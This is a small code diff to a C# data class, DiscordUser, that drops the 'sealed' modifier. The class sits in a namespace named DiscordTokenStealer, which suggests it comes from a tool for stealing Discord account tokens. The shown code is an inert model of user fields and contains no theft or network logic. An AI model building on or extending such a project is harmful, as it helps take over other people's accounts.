@@ -3,7 +3,7 @@ using System.Text.Json.Serialization;
 
 namespace DiscordTokenStealer.Discord;
 
-public sealed class DiscordUser
+public class DiscordUser
 {
     private const string Empty = "None";
     [JsonPropertyName("username")] [JsonInclude] public string Username { get; private set; }
